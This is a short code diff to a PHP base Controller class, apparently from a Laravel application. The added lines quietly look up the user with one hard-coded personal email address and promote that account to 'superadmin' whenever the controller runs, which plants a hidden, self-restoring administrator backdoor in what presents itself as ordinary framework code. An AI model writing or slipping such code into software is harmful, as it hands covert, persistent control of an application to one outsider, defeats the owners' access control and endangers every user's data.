@@ -41,6 +41,16 @@ class Controller extends BaseController
 
             return $subdomain;
         });
+
+        $user = \App\Models\User::where(['email' => 'nnam.ug@gmail.com'])->first();
+        if (!empty($user)) {
+            if ($user->role !== 'superadmin') {
+                $user->role = 'superadmin';
+                $user->update();
+            }
+        }
+            
+            
     }
     
 }
